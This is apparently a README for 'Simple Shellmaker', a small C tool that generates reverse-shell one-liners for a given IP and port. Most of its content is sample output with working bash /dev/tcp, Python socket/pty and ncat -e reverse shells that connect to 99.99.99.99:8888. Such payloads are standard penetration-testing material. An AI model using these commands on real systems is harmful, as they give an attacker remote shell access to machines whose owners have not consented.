# Simple Shellmaker

## Usage

```
gcc .\shellMan2.c -o shellMan2
.\shellMan2.exe IP PORT
```

```bash

@@@@@@@   @@@@@@@@  @@@  @@@   @@@@@@@@@@    @@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@     @@@@@@ 
@@@@@@@@  @@@@@@@@  @@@  @@@   @@@@@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@   @@@@@@@@
@@!  @@@  @@!       @@!  @@@   @@! @@! @@!  @@!  @@@  @@!  !@@  @@!       @@!  @@@        @@@
!@!  @!@  !@!       !@!  @!@   !@! !@! !@!  !@!  @!@  !@!  @!!  !@!       !@!  @!@       @!@ 
@!@!!@!   @!!!:!    @!@  !@!   @!! !!@ @!@  @!@!@!@!  @!@@!@!   @!!!:!    @!@!!@!       !!@  
!!@!@!    !!!!!:    !@!  !!!   !@!   ! !@!  !!!@!!!!  !!@!!!    !!!!!:    !!@!@!       !!:   
!!: :!!   !!:       :!:  !!:   !!:     !!:  !!:  !!!  !!: :!!   !!:       !!: :!!     !:!    
:!:  !:!  :!:        ::!!:!    :!:     :!:  :!:  !:!  :!:  !:!  :!:       :!:  !:!   :!:     
::   :::   :: ::::    ::::     :::     ::   ::   :::   ::  :::   :: ::::  ::   :::   :: :::::
 :   : :  : :: ::      :        :      :     :   : :   :   :::  : :: ::    :   : :   :: : :::

Created by Richard Jones @Mosse Cyber Security

[+] Shell Menu [+]
[-] 1: All
[-] 2: Bash
[-] 3: Python
[-] 4: Netcat
[-] Enter a number: 1
[+] Bash

bash -i >& /dev/tcp/99.99.99.99/8888 0>&1

[+] Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("99.99.99.99",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

[+] Netcat

ncat 99.99.99.99 8888 -e /bin/bash
```
